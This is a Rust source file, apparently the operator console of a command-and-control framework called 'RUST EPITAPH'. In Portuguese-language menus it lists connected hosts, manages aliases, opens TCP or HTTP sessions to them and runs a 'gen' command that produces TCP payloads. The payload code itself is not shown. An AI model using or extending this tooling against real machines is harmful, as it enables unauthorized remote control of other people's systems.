use std::io::{self, Write};
use std::sync::Arc;
use uuid::Uuid;

use crate::utils::servers::database_struct::Database;
use crate::utils::servers::server_tcp::{user_input, handle_clients_tcp, manage_alias};
use crate::utils::servers::server_http::handle_clients_http;
use crate::utils::payload::tcp_generator::gen_tcp;

pub fn spawn_menu(database: Arc<Database>) {
   
    loop {
        let db_clone = Arc::clone(&database);
        
        if !interprete(db_clone) {
            
            break;
        }
    }
}

pub fn banner() {
    
    std::process::Command::new("clear").status().unwrap();
    println!(
        r#"
@@@@@@@   @@@  @@@   @@@@@@  @@@@@@@     @@@@@@@@  @@@@@@@   @@@  @@@@@@@   @@@@@@   @@@@@@@   @@@  @@@  
@@@@@@@@  @@@  @@@  @@@@@@@  @@@@@@@     @@@@@@@@  @@@@@@@@  @@@  @@@@@@@  @@@@@@@@  @@@@@@@@  @@@  @@@  
@@!  @@@  @@!  @@@  !@@        @@!       @@!       @@!  @@@  @@!    @@!    @@!  @@@  @@!  @@@  @@!  @@@  
!@!  @!@  !@!  @!@  !@!        !@!       !@!       !@!  @!@  !@!    !@!    !@!  @!@  !@!  @!@  !@!  @!@  
@!@!!@!   @!@  !@!  !!@@!!     @!!       @!!!:!    @!@@!@!   !!@    @!!    @!@!@!@!  @!@@!@!   @!@!@!@!  
!!@!@!    !@!  !!!   !!@!!!    !!!       !!!!!:    !!@!!!    !!!    !!!    !!!@!!!!  !!@!!!    !!!@!!!!  
!!: :!!   !!:  !!!       !:!   !!:       !!:       !!:       !!:    !!:    !!:  !!!  !!:       !!:  !!!  
:!:  !:!  :!:  !:!      !:!    :!:       :!:       :!:       :!:    :!:    :!:  !:!  :!:       :!:  !:!  
::   :::  ::::: ::  :::: ::     ::        :: ::::   ::        ::     ::    ::   :::   ::       ::   :::  
 :   : :   : :  :   :: : :      :        : :: ::    :        :       :      :   : :   :         :   : :  
                                                                                                         
Your last words, will eventually rust.
"#
    );
}

pub fn interprete(database: Arc<Database>) -> bool {
    print!("\n> ");
    io::stdout().flush().expect("Falha ao fazer flush do stdout");

    let input = user_input();
    let comandos: Vec<&str> = input.split_whitespace().collect();

    if comandos.is_empty() {
        return true;
    }

    match comandos[0].to_lowercase().as_str() {
        "connect" => {
            if comandos.len() != 2 {
                println!("Comando Incorreto.");
                return true;
            }
            let db_clone = Arc::clone(&database);

            if let Some(id) = db_clone.alias_to_id(comandos[1]) {

                connection_type(database, &id, comandos[1]);

            } else {

                match comandos[1].parse::<Uuid>() {

                    Ok(uuid) => connection_type(database, &uuid, comandos[1]),
                    Err(_) => println!("Erro: A Conexão não tem um tipo valido registrado."),
                    
                }
            }
            true
        }
        "alias" => {
            if comandos.len() != 3 {
                println!("Comando Incorreto.");
            } else {
                manage_alias(database, comandos[1], comandos[2]);
            }
            true
        }
        "list" => {
            if database.is_empty() {
                println!("-Nenhum Host Online-");
            } else {
                database.list_clientes();
            }
            true
        }
        "help" => {
            println!("------Commands------");
            println!("connect <ID | Alias>");
            println!("alias <ID> <Alias>");
            println!("list");
            println!("clear");
            println!("help");
            println!("banner");
            println!("gen <arg1> <arg2>");
            println!("exit");
            true
        }
        "clear" => {
            std::process::Command::new("clear").status().unwrap();
            true
        }
        "gen" => {
            if comandos.len() < 3 {
                println!("Uso: gen <arg1> <arg2>");
            } else {
                gen_tcp(comandos[1], comandos[2]);
            }
            true
        }
        "banner" => {
            banner();
            true
        }
        "exit" => false,
        _ => {
            println!("Comando inexistente");
            true
        }
    }
}

fn connection_type(database: Arc<Database>, id: &Uuid, original: &str) {
    match database.get_type(id) {
        Some(tipo) if tipo == "TCP" => handle_clients_tcp(database, original),
        Some(tipo) if tipo == "HTTP" => handle_clients_http(database,original),
        Some(_) => println!("Erro: Tipo de conexão vazia"),
        None => println!("Erro: A Conexão não tem um tipo valido registrado."),
    }
}
